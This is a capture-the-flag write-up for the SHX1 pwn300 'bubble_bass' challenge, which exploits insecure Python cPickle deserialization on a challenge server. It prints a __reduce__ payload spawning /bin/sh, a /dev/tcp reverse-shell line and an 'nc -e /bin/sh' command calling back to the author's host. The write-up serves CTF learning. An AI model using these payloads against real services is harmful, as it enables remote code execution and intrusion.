---
title: "SHX1 : pwn300-bubble_bass"
date: "2017-01-16T01:04:52.000Z"
lastmod: "2017-06-05T15:29:06.000Z"
tags: ["ctf", "cryptography", "programming", "shx1"]
images: ["/content/images/2017/01/Selection_147.jpg"]
slug: "shx1-pwn300-bubble_bass"
url: "/shx1-pwn300-bubble_bass/"
---
Bubble Bass has a vulnerable service. Can you exploit it and read the flag.txt file?   
Server: 34.197.58.21   
Port: 9997   
Category: Potent PwnablesPoints: 300   
Given clue:   
self.received = self.request.recv(1024).strip()   
self.result = cPickle.loads(self.received)

## Solution

Connected to the server..   
![](/content/images/2017/01/Selection_148.jpg)

..the server asks me to add two numbers, and quits w/ 1 second timeout, no time to manually reply.

No problem, wrote a py socket script...

![](/content/images/2017/01/Selection_149.jpg)

Now clearly its a [Caesar](https://en.wikipedia.org/wiki/Caesar_cipher) cipher.

Solved w/ my caesar deco..

<script src="https://gist.github.com/intrd/2c19d329885dfee9fc70c38910394a7d.js"></script>

![](/content/images/2017/03/Selection_999-045-.png)

Caesar... `rot=20`

Now comes the real challenge..

![](/content/images/2017/01/Selection_152.jpg)

..the server asks me for a file, tried `flag.txt`, of course no success.. everything containing `*flag*` returns `Really? Maybe next time..`

Okay, back to the given clue:

```python
self.received = self.request.recv(1024).strip()  
self.result = cPickle.loads(self.received)
```

hmm.. [bubble bass](http://en.spongepedia.org/index.php?title=Bubble_Bass).. pickles.. spongebob? hehe..

Found this:

- [Exploiting misuse of Python's "pickle"](https://blog.nelhage.com/2011/03/exploiting-pickle/)

Tried the test exploit:

```python
class RunBinSh(object):  
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/sh',),))
```

..and got the `Server received` message from the server, but no shell.. we can't see the server raw output, but im on the right way 4 sure..

Started `nc` server locally `nc -vv -l -p 6888` to wait for connections and tried to execute on server side the classic `/bin/sh </dev/tcp/175.14.11.121/6888 >&0 2>&0`, no success.. the server accept my command but no connection here, maybe some filtering..

Ok, lets test if `nc` is enabled on server side.. `nc -e /bin/sh 175.14.11.121 6888`

![](/content/images/2017/03/Selection_999-031-.png)

Wow!   
we got a reverse shell..   
now just `cat flag.txt` 4 the win!

Flag: **shellter{CENSORED}**

Awesome contest [shellterlabs.com](http://shellterlabs.com).   
I arrived too late and could not could not try the other challs, but the next one can count on me :)

#### Final exploit

<script src="https://gist.github.com/intrd/f08305c6c87a1a80cb89522ef8068444.js"></script>
